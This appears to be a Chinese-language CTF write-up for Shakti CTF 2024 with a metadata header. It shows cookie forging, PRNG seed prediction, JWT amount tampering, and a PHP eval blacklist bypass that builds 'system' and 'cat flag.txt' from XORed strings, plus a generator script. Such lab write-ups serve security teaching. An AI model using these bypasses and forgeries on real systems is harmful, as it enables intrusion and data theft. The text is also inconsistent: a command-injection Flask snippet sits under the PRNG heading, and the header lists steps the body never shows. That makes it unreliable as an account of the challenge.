---
title: Shakti CTF (2024) Writeup
contest: Shakti CTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [cookie-forge, command-injection, jwt-none, eval-restricted, xor-obfuscation-php]
attack_chain:
- Cookie 解析 admin=0 → 1 base64 改 admin 标志
- 路由 / first_num 泄露伪随机种子
- seed 爆破 1e6-9e6 → second_num
- JWT secret=222333 HS256 弱密码
- 算法改 alg=none 绕签名
- product_id 整数溢出购买 -1
- checkout cookie shopping_token 含 amount 字段改 1e9
- PHP preg_match 限制 eval 但可 XOR 字符串拼接
- "111114" ^ "BHBETY" = "system"
- "111q1411w111" ^ "RPEQWXPVYEIE" = "cat flag.txt"
- 注入 eval("("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE")")
key_payload: eval(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))
one_liner: Shakti CTF 2024 混合题：Cookie 伪造 + JWT 爆破 + PHP 异或绕过黑名单。
lesson: PHP preg_match 黑名单在过滤单字符时常用 XOR/自增绕过。
quality: medium
---
# Shakti CTF 2024 Writeup

## Web 1 - Cookie 伪造
- `Set-Cookie: cookie=eyJhZG1pbiI6MH0%3D` (base64 = {"admin": 0})
- 改 `eyJhZG1pbiI6MX0%3D` (admin: 1)

## Web 2 - PRNG 预测
```python
@app.get('/')
def index():
    test = request.args.get('test', None)
    if test is None:
        return render_template('index.html')
    command = f"find {test}"
    try:
        output = os.popen(command).read()
```
- 拿到 first_num
- seed 范围 1e6-9e6，遍历 random.seed + random.randint 预测 second_num
- `GET /guess?num=<second_num>`

## Web 3 - JWT 伪造
- `Cookie: shopping_token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhbW91bnQiOiA1MDAwfQ.qdH04CeYzu_qZoL2gBNdEsmtc3XKME6wAFw7CdjId5E`
- jwt.io 看到 amount=5000
- 改 amount=1e9 → 余额溢出

## Web 4 - PHP XOR 绕过
```php
if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $command)) {
    return false;
}
if(filter($command)) {
    eval($command);
}
```
- 异或构造：
  - "111114" ^ "BHBETY" = "system"
  - "111q1411w111" ^ "RPEQWXPVYEIE" = "cat flag.txt"
- payload: `eval(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))`
- 参考 GrabCON CTF 2021 Basic Calc

## 自动化脚本
```python
string_code = ['system','cat flag.txt']
obfuscated_code = ""
charset = "1234567890qwertyuiopdfghjklzxvbnmQWERTYUIOPDFGHJKLZXVBNM"
for code in string_code:
    obfuscated = ""
    set_a, set_b = "", ""
    for i in code:
        for j in charset:
            for k in charset:
                if ord(j) ^ ord(k) == ord(i):
                    set_a += j; set_b += k
                    break
            else: continue
            break
    obfuscated_code += f'("{set_a}"^"{set_b}")'
```
